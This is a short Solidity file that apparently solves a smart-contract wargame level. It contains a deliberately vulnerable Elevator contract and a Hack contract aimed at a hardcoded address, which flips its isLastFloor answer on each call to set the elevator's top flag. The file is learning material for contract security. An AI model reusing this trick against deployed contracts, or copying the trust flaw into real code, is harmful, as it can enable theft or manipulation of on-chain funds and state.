// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack{
    Elevator elevator = Elevator(address(0xEed36b82D33EB05771c9447ab87809DEb99c5370));
    bool toggle = true;
    
    function isLastFloor(uint value) external returns (bool){
        toggle = !toggle;
        return toggle;
    }
    
    function hack() public payable {
        elevator.goTo(1);
}
}